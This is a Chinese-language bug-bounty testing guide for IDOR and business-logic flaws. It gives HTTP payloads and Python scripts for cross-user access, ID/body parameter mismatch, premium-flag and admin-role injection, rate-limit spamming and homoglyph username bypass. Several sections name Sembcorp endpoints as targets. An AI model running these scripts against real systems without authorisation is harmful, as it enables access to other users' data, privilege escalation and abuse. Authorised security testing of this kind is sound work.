# IDOR & 业务逻辑漏洞 - 快速测试指南

> **基于**: HackerOne 最新披露案例（2026-05）  
> **统计**: IDOR 占所有漏洞的 44%，是最常见的漏洞类型  
> **最后更新**: 2026-05-21

---

## 🎯 核心思路

**IDOR 的本质**: 权限检查与实际操作对象不一致

```
URL 检查资源 A → Body 操作资源 B → 成功修改 B = IDOR 漏洞
```

---

## 📋 测试清单（按优先级）

### P0: URL vs Body 参数不匹配 ⭐⭐⭐⭐⭐

**奖金案例**: GitHub Enterprise Server - 高危

**测试步骤**:
1. 找到接受 ID 参数的 API 端点
2. URL 使用你有权限的资源 A
3. Body 使用你无权限的资源 B
4. 检查是否成功操作了 B

**Payload**:
```http
POST /api/v1/forms/123/update HTTP/1.1
Authorization: Bearer YOUR_TOKEN

{
  "form_id": 456,  // ← 尝试修改其他表单
  "settings": {...}
}
```

**自动化检测**:
```python
def test_idor_parameter_mismatch(base_url, token, endpoint, your_resource, other_resource):
    headers = {'Authorization': f'Bearer {token}'}
    
    response = requests.post(
        f'{base_url}/api/{endpoint}/{your_resource}',
        json={'id': other_resource, 'action': 'update'},
        headers=headers
    )
    
    if response.status_code == 200:
        print(f"[!] 发现 IDOR！可以操作其他资源")
        return True
    return False
```

**Sembcorp 潜在端点**:
- `/umbraco/api/contactform/submit` - 多表单 IDOR
- `/api/[resource]/[id]/update` - 通用更新接口
- 任何带 `company_id`, `site_id`, `form_id` 的 API

---

### P1: 跨用户资源访问 ⭐⭐⭐⭐⭐

**奖金案例**: LinkedIn, Mozilla, Basecamp - 中高危

**测试步骤**:
1. 创建两个测试账户（User A, User B）
2. 获取 User A 的 Token
3. 尝试访问 User B 的资源
4. 检查是否能读取/修改数据

**常见端点**:
```
GET /api/users/OTHER_USER_ID/profile
GET /api/orders/OTHER_ORDER_ID
PUT /api/users/OTHER_USER_ID/settings
DELETE /api/users/OTHER_USER_ID/tokens/TOKEN_ID
```

**Payload**:
```python
# 尝试访问其他用户的资料
response = requests.get(
    'https://target.com/api/users/12345/profile',
    headers={'Authorization': 'Bearer YOUR_TOKEN'}
)

if response.status_code == 200:
    print(f"[!] 可以访问其他用户数据")
    print(response.json())
```

**Sembcorp 测试建议**:
- 投资者关系个人资料
- 电子邮件警报订阅
- 内部员工门户（如果有）

---

### P2: 已停用资源访问 ⭐⭐⭐⭐

**奖金案例**: LinkedIn Competitor Analytics - 中危

**原理**: 软删除的资源仍可通过 API 访问

**测试方法**:
```python
# 已知已停用的资源 ID
deactivated_ids = ['12345', '67890', '11111']

for resource_id in deactivated_ids:
    response = requests.get(
        f'https://target.com/api/companies/{resource_id}/analytics',
        headers={'Authorization': 'Bearer TOKEN'}
    )
    
    if response.status_code == 200:
        print(f"[!] 可以访问已停用资源: {resource_id}")
```

**如何找到已停用资源 ID**:
- 公开的公司页面列表
- Wayback Machine 历史快照
- 搜索引擎缓存
- 旧的 API 响应

---

### P3: 付费功能绕过 ⭐⭐⭐⭐⭐

**奖金案例**: Pixiv Ad Blocking - $3,000（高危）

**测试思路**: 篡改付费状态参数

**Payload**:
```json
// 尝试启用付费功能
{"is_premium": true}
{"subscription_tier": "premium"}
{"ad_blocking_enabled": true}
{"role": "premium_user"}
{"verified_investor": true}
```

**测试脚本**:
```python
def test_premium_bypass(base_url, token, endpoint):
    headers = {'Authorization': f'Bearer {token}'}
    
    payloads = [
        {'is_premium': True},
        {'subscription_tier': 'premium'},
        {'role': 'admin'},
    ]
    
    for payload in payloads:
        response = requests.post(f'{base_url}{endpoint}', 
                                json=payload, 
                                headers=headers)
        
        if response.status_code == 200:
            # 验证功能是否真的启用
            verify = requests.get(f'{base_url}/api/user/preferences', headers=headers)
            if 'premium' in str(verify.json()).lower():
                print(f"[!] 业务逻辑绕过成功！")
                return True
    
    return False
```

**Sembcorp 测试位置**:
- 投资者关系高级内容
- 电子邮件警报订阅选项
- 内部文档访问权限

---

### P4: 速率限制绕过 ⭐⭐⭐

**奖金案例**: Pixiv Spam - $200

**测试脚本**:
```python
import time

def test_rate_limiting(base_url, token, endpoint, max_requests=20):
    headers = {'Authorization': f'Bearer {token}'}
    success_count = 0
    
    for i in range(max_requests):
        response = requests.post(f'{base_url}{endpoint}', json={
            'message': f'Spam message {i}'
        }, headers=headers)
        
        if response.status_code == 200:
            success_count += 1
        else:
            print(f"[{i+1}] 被阻止 ({response.status_code})")
            break
        
        time.sleep(0.1)
    
    print(f"\n总计成功发送: {success_count}/{max_requests}")
    if success_count > max_requests * 0.5:
        print("[!] 速率限制不足！")
        return True
    
    return False
```

---

### P5: Unicode Homoglyph 绕过 ⭐⭐⭐⭐

**奖金案例**: Mozilla Display Name - $500

**原理**: 使用视觉上相同的 Unicode 字符绕过过滤

**同形异义字表**:
```
a → а (西里尔字母)
c → с (西里尔字母)
e → е (西里尔字母)
i → і (西里尔字母)
m → м (西里尔字母)
o → о (西里尔字母)
p → р (西里尔字母)
s → ѕ (西里尔字母)
```

**测试 Payload**:
```python
# 受保护的关键词
restricted = ['admin', 'support', 'official', 'sembcorp']

# 生成变体
homoglyph_variants = [
    'аdmin',      # 西里尔字母 а
    'ѕupport',    # 西里尔字母 ѕ
    'оfficial',   # 西里尔字母 о
    'Ѕembcorp',   # 西里尔字母 Ѕ
]

for variant in homoglyph_variants:
    response = requests.post('https://target.com/api/register', json={
        'username': variant,
        'email': f'test_{variant}@attacker.com'
    })
    
    if response.status_code == 200:
        print(f"[!] 绕过成功: {variant}")
```

**Sembcorp 测试位置**:
- 联系表单姓名字段
- 用户注册页面
- 评论系统

---

## 🔧 自动化工具

### IDOR Scanner

```python
class IDORScanner:
    def __init__(self, base_url, token):
        self.base_url = base_url
        self.token = token
        self.headers = {'Authorization': f'Bearer {token}'}
    
    def scan_all_endpoints(self, endpoints):
        """扫描所有端点的 IDOR"""
        results = []
        
        for endpoint in endpoints:
            # 测试 1: 参数不匹配
            if self.test_parameter_mismatch(endpoint):
                results.append(('PARAMETER_MISMATCH', endpoint))
            
            # 测试 2: 跨用户访问
            if self.test_cross_user_access(endpoint):
                results.append(('CROSS_USER', endpoint))
            
            # 测试 3: 已停用资源
            if self.test_deactivated_resources(endpoint):
                results.append(('DEACTIVATED', endpoint))
        
        return results
```

### Business Logic Tester

```python
class BusinessLogicTester:
    def test_premium_features(self, endpoints):
        """测试付费功能绕过"""
        payloads = [
            {'is_premium': True},
            {'subscription_tier': 'premium'},
            {'role': 'admin'},
        ]
        
        for endpoint in endpoints:
            for payload in payloads:
                response = requests.post(endpoint, json=payload, headers=self.headers)
                if self.verify_feature_enabled(response):
                    return True
        
        return False
    
    def test_rate_limiting(self, endpoint, max_requests=20):
        """测试速率限制"""
        success_count = 0
        
        for i in range(max_requests):
            response = requests.post(endpoint, json={'test': i}, headers=self.headers)
            if response.status_code == 200:
                success_count += 1
            else:
                break
        
        return success_count > max_requests * 0.5
```

---

## 📊 漏洞评级参考

| 漏洞类型 | 严重程度 | CVSS 估算 | 典型奖金 |
|---------|---------|----------|---------|
| IDOR - 敏感数据访问 | 高危 | 7.0-8.5 | $1,000-$5,000 |
| IDOR - 数据修改 | 高危 | 7.5-9.0 | $2,000-$10,000 |
| 业务逻辑绕过 - 付费功能 | 高危 | 7.0-8.0 | $1,000-$5,000 |
| Unicode Homoglyph 绕过 | 中危 | 5.0-6.5 | $500-$2,000 |
| 速率限制缺失 | 低-中危 | 3.0-5.0 | $200-$1,000 |

---

## ⚠️ 常见问题

### Q1: 如何判断是否存在 IDOR？

**A**: 三个关键指标：
1. API 同时接受 URL 和 Body 中的资源 ID
2. 权限检查与实际操作对象可能不一致
3. 批量操作或管理功能

### Q2: 如何找到其他用户的资源 ID？

**A**: 
- 枚举测试（1, 2, 3...）
- 从公开信息收集
- 从自己的资源 ID 推断规律
- Wayback Machine 历史数据

### Q3: 业务逻辑绕过最难的部分是什么？

**A**: 理解业务流程。需要：
- 了解正常用户的操作流程
- 识别关键的验证点
- 尝试跳过或篡改验证步骤

### Q4: Unicode Homoglyph 真的有效吗？

**A**: 是的！很多网站只过滤 ASCII 字符，忽略了 Unicode。视觉效果完全相同，但字节不同。

---

## 💡 经验教训

### 1. IDOR 是最容易被忽略的漏洞

**原因**: 
- 开发者认为"已经检查了权限"
- 但检查的是错误的资源
- 自动化扫描难以发现

**对策**: 
- 手动测试每个 API 端点
- 特别关注批量操作
- 系统化测试参数不匹配

### 2. 业务逻辑漏洞奖金最高

**案例**: Pixiv Ad Blocking - $3,000

**原因**: 
- 直接影响收入
- 难以自动化检测
- 需要深入理解业务

**对策**: 
- 手动测试付费功能
- 尝试各种参数组合
- 对比不同用户角色

### 3. 不要忽视小问题

**案例**: Unicode Homoglyph - $500

**原因**: 
- 看似微不足道
- 但可以用于钓鱼
- 品牌保护很重要

**对策**: 
- 测试所有字符串输入
- 准备 Homoglyph 字典
- 关注品牌名称保护

---

## 📚 相关文档

- **详细案例分析**: `D:\scan\common\HACKERONE_LATEST_CASES_ANALYSIS.md`
- **完整测试模板**: `D:\scan\report\安全测试模板.md`
- **CSS 攻击参考**: `D:\scan\common\CSS_ATTACK_QUICK_REFERENCE.md`

---

**最后提醒**: IDOR 和业务逻辑漏洞需要**手动测试**，自动化工具只能辅助！
